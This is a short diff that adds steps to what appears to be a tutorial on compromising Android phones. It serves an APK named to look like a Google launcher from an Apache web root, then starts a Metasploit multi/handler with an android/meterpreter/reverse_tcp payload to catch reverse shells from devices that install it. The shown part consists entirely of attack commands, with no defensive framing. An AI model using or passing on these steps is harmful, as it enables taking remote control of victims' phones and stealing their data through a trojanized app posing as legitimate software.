@@ -65,4 +65,20 @@ cmd > cd originalfolder
 cmd > cd dist
 cmd > ls
 
+==> on service apache2
+
+cmd > service apache2 start
+
+==> then move the apk to /var/www/html
+cmd > cp com.google.android.launcher_2017-12-07.apk /var/www/html       
+
+==> then launch msfconsole
+cmd > msfconsole
+cmd > use exploit/multi/handler 
+cmd > set payload android/meterpreter/reverse_tcp 
+cmd > show options
+cmd > set lhost **.**.**.**
+cmd >set lport 1234
+cmd > run
+
  
